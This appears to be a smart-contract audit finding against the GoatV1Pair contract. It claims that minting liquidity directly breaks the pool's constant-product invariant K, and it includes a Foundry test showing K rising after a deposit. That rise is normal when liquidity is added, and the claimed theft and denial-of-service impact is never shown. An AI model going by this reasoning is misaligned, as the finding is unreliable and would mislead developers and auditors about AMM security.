Agreeable Aquamarine Dog

high

# Breakage of K Invariant

## Summary
The K invariant, which is meant to remain constant, is susceptible to alteration, rendering it no longer invariant.

## Vulnerability Detail

The Constant Product invariant assumes X*Y=k, where X and Y are the supply of tokens in a pool and k is the invariant.

But it's possible to change this K value calling `GoatV1Pair::mint` with specific values, if the pool is in `AMM mode`.
## Impact

A malicious actor possesses the capability to manipulate the K value of the pool at will, thereby enabling the theft of assets or facilitating a denial-of-service (DoS) attack on the liquidity pool.

## Code Snippet
[https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L114-L174](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L114-L174)

## Proof of concept

A user, let say Alice, can mint LPs directly on the `GoatV1Pair` contract without using the `GoatRouterV1` contract. But Alice can send arbytrary amount of assets, get LPs based on the minimum of the two assets, and thus, the reserves will be updated based on the amount of assets send. 

Consequently, when the `K value` is recalculated, this **invariant** value gets altered.



### Here are the most important parts of code in the `mint` function:

1. Cache new asset balances into variables:
```solidity
uint256 balanceEth = IERC20(_weth).balanceOf(address(this));
uint256 balanceToken = IERC20(_token).balanceOf(address(this));
```

2. Calculate the LPs liquidity returned to the minter based on the minimum ratio of the two assets:
```solidity
amountWeth = balanceEth - reserveEth - _pendingLiquidityFees - _pendingProtocolFees;
amountToken = balanceToken - reserveToken;
liquidity = Math.min((amountWeth * totalSupply_) / reserveEth, (amountToken * totalSupply_) / reserveToken);
```

3. Update reserves with the cached values:
```solidity
_update(balanceEth, balanceToken, true);
```

As evident from the code, the reserves are updated based on the assets sent to the contract, without strict adherence to predetermined rules or constraints.

In the context of `AMM` mode, the calculation of the K invariant is performed as follows:

```solidity
(_reserveEth, _reserveToken) = pair.getStateInfoAmm();

uint256 KAfterAliceDeposit = uint256(_reserveEth) * uint256(_reserveToken);
```

### Foundry test

The following test can be added to `GoatV1Pair.t.sol`.

```js
function test_H1_KInvariantBreakInMint() public {
        address Alice = makeAddr("Alice");
        _fundMe(goat, Alice, 100 ether);
        _fundMe(weth, Alice, 100 ether);


        address Bob = makeAddr("Bob");
        _fundMe(goat, Bob, 100 ether);
        _fundMe(weth, Bob, 100 ether);


        // note: Pair creation
        GoatTypes.InitParams memory initParams;
        initParams.virtualEth = 10e18;
        initParams.initialEth = 10e18;
        initParams.initialTokenMatch = 1000e18;
        initParams.bootstrapEth = 10e18;

        //note: Set Pair into AMM on the first deposit
        (, uint256 tokenAmtForAmm) = _mintInitialLiquidity(initParams, users.lp);
        // since reserve eth will be 10e18 and reserveToken will be 250e18
        // sqrt of their product = 50e18
        uint256 expectedLp = 50e18 - MINIMUM_LIQUIDITY;
        uint256 initialLpBalance = pair.balanceOf(users.lp);
        assertEq(initialLpBalance, expectedLp);
        (uint256 reserveEth, uint256 reserveToken) = pair.getReserves();

        assertEq(reserveEth, initParams.bootstrapEth);
        assertEq(reserveToken, tokenAmtForAmm);

        uint256 vestingUntil = pair.vestingUntil();
        assertEq(vestingUntil, block.timestamp + _VESTING_PERIOD);

        uint112 _reserveEth;
        uint112 _reserveToken;

        (_reserveEth, _reserveToken) = pair.getStateInfoAmm();
        uint256 KBeforeAliceDeposit = uint256(_reserveEth) * uint256(_reserveToken);

        //note: console.log after first LP mint
        console.log("K before malicious Alice deposit : ", KBeforeAliceDeposit);
        console.log(" ");

        //note: get out of the vesting periode
        vm.warp(block.timestamp + 8 days); 

        //note: Alice deposit weth and goat so it break k invariant
        vm.startPrank(Alice);
        weth.transfer(address(pair), 1 ether);
        goat.transfer(address(pair), 1 ether);

        pair.mint(Alice);
        vm.stopPrank();

        (_reserveEth, _reserveToken) = pair.getStateInfoAmm();
        uint256 KAfterAliceDeposit = uint256(_reserveEth) * uint256(_reserveToken);

        console.log("K after malicious Alice deposit :  ", KAfterAliceDeposit);

        console.log("K value never change : ", KBeforeAliceDeposit == KAfterAliceDeposit);
    }
```

```bash
$ forge test --match-path test/foundry/exchange/GoatV1Pair.t.sol --match-test test_H1_KInvariantBreakInMint -vvv

Ran 1 test for test/foundry/exchange/GoatV1Pair.t.sol:GoatExchangeTest
[PASS] test_H1_KInvariantBreakInMint() (gas: 3887028)

Logs:
  K before malicious Alice deposit :  2500000000000000000000000000000000000000
   
  K after malicious Alice deposit :   2761000000000000000000000000000000000000

  K value never change :  false
```

## Tool used

Manual analysis

Foundry tests

## Recommendation

Restrict the invocation of the `GoatV1Pair::mint` function solely to the `GoatRouterV1` contract. 

Additionally, consider implementing a require statement for more efficient gas usage.
